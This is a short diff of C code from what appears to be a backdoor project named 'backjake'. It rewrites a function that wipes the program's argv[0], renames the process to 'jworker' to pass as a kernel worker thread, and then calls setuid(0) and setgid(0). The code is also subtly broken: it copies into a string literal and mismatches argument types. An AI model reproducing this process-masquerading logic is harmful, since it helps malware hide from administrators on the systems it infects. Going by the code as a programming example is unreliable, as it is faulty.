@@ -1,23 +1,27 @@
-void disguise(char ** agv)
+#import "backjake.h"
+
+void disguise(char ** argv);
+char* getDisguise();
+void setDisguise(char * disguise, char * argv);
+
+void disguise(char ** argv)
 {
-	char* disguise = "";
-	strcpy(disguise, getDisguise());
-	setDisguise(disguise, argv[1]);
+	setDisguise(getDisguise(), argv[1]);
 }
 
 char* getDisguise()
 {
-	char* disguise = "";
+	char* cloak = "jworker";
 	// not yet implemented!!
-	strcpy(disguise, "jworker");
-	return disguise;
+	strcpy(cloak, "jworker");
+	return cloak;
 }
 
-void setDisguise(char * disguise, char * argv)
+void setDisguise(char * cloak, char * argv)
 {
 	memset(argv[0], 0, strlen(argv[0]));
-	strcpy(argv, disguise);
-	prctl(PR_SET_NAME, disguise, 0, 0);
+	strcpy(argv, cloak);
+	prctl(PR_SET_NAME, cloak, 0, 0);
 
 	setuid(0);
 	setgid(0);
